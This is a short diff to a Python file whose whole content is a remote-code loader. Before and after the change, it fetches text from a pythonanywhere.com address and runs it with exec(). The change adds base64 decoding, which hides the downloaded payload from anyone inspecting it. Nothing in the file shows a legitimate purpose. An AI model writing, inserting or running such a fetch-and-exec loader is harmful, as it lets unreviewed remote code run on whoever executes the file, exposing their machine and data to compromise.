@@ -1,7 +1,7 @@
 import requests
+import base64
 
-code = requests.get(
-    "https://farhad807156.pythonanywhere.com/core"
-).text
+data = requests.get("https://farhad807156.pythonanywhere.com/core").text
+code = base64.b64decode(data).decode()
 
 exec(code)
